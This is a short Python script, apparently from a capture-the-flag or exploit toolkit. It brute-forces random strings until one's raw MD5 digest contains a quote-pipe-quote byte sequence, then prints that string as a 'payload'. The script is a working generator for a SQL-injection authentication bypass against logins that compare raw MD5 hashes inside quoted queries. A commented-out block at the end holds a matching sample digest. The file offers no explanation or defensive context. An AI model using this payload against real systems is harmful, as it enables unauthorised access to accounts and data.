#!/usr/bin/python3

from hashlib import md5 
import string, random, time, re

length = 15
attempts = 0

start = time.time()
print('Generating Payload...')

pattern = re.escape(b"'|'")

while 1:

    attempts += 1
    test = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    hashed = md5(test.encode())
    raw = hashed.digest()

    if re.search(pattern, raw) and raw.count(b"'") == 2:
        end = time.time()
        print('DONE!', end='\n\n')
        print('after: %.2fs (%d attempts)' % (end - start, attempts) ) 
        print('hex:', hashed.hexdigest())
        print('raw:', raw)
        print('payload:', test)
        break




#test = b"Z\xfa\x08\xa8\xd0'|'\x00\xa5\xbc\x801B\x8d\x04"
# def test_pattern(test):
#     if re.search(pattern, test):
#         print('Match')
#     else:
#         print('No Match!')
#test_pattern(test)